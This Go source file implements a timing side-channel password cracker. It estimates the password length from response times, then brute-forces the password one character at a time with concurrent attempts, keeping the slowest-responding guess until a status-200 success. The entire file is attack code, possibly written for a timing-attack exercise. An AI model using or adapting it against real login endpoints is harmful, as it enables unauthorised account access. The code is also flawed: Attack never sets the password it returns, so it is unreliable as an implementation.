package main

import (
	"context"
	"log"
	"strings"
	"sync"
	"time"
)

type PasswordAttacker interface {
	Attack() string
}

type result struct {
	statusCode int
	pwd        string
	duration   time.Duration
}

type attacker struct {
	alphabet     []rune
	bestGuessPwd string
	pos          int
	minPwdChars  int
	maxPwdChars  int

	wg       *sync.WaitGroup
	ctx      context.Context
	cancelFn context.CancelFunc

	resCh  chan result
	ctrlWg *sync.WaitGroup
}

func NewPasswordAttacker(alphabet string, minChars, maxChars int) PasswordAttacker {
	return &attacker{
		alphabet:    []rune(alphabet),
		resCh:       make(chan result),
		minPwdChars: minChars,
		maxPwdChars: maxChars,
	}
}

func (a *attacker) pwdLengthFinder() (foundLen string) {
	ress := make([]result, a.maxPwdChars)

	ctx, _ := context.WithCancel(context.Background())
	resCh := make(chan result, a.maxPwdChars)

	for i := 0; i < a.maxPwdChars; i++ {
		NewAttempt(ctx, strings.Repeat("a", i+1), 10, resCh)
		log.Printf("--->>> LengthFinder. Before read from resCh...")
		ress[i] = <-resCh
	}

	maxRes := Max(ress[1:]) // somehow first time is always longest, so we skip it

	log.Printf("--->>> Max time password %+v", maxRes)

	return maxRes.pwd
}

func (a *attacker) Attack() (foundPwd string) {
	foundBasePwd := a.pwdLengthFinder()

	l := len(a.alphabet)

	a.ctx, a.cancelFn = context.WithCancel(context.Background())

	a.wg = &sync.WaitGroup{}

	a.ctrlWg = &sync.WaitGroup{}
	for i := 0; i < 10; i++ {
		a.pos = 0
		a.bestGuessPwd = foundBasePwd

		for a.pos < a.maxPwdChars {
			a.ctrlWg.Add(1)

			go a.processResults()

			a.wg.Add(l)

			for i := 0; i < l; i++ {
				go a.try(a.alphabet[i])
			}

			a.wg.Wait()

			a.ctrlWg.Wait()

			a.pos++
		}
	}
	a.cancelFn()

	return foundPwd
}

func (a *attacker) try(ch rune) {
	defer a.wg.Done()

	chars := []rune(a.bestGuessPwd)
	chars[a.pos] = ch
	pwd := string(chars)

	// log.Printf("BEST GUESS PWD %s; a.pos: %d", pwd, a.pos)
	NewAttempt(a.ctx, pwd, 10, a.resCh)
	// log.Printf("BEST GUESS PWD AFTER NewAttempt: %s; a.pos: %d", pwd, a.pos)
}

func (a *attacker) processResults() {
	defer a.ctrlWg.Done()

	count := 0
	lab := len(a.alphabet)
	results := make([]result, lab)

	for {
		select {
		case res := <-a.resCh:
			// log.Printf("Attacker gets result: %+v", res)
			// Found!
			if res.statusCode == 200 {
				log.Printf("SUCCESS: Found PASSWORD %s;", res.pwd)
				a.cancelFn()
				return
			} else {
				// Cycle is ready
				results[count] = res
				if count == lab-1 {
					for _, r := range results {
						if len(r.pwd) < a.pos {
							log.Fatalf("Passwords in the batch %d should have the same length %+v", a.pos, results)
						}
					}
					count = 0
					max := Max(results)
					a.bestGuessPwd = max.pwd
					// log.Printf("Cycle is done. Best Guess Pwd %s; count: %d; results: %+v", a.bestGuessPwd, count, results)
					log.Printf("Cycle is done. Best Guess Pwd %s;", a.bestGuessPwd)
					return
				} else {
					// log.Printf("Cycle count: %d; results: %+v", count, results)
					count++
				}
			}
		case <-a.ctx.Done():
			log.Printf("Finishing control results routine")
			return
		}
	}
}
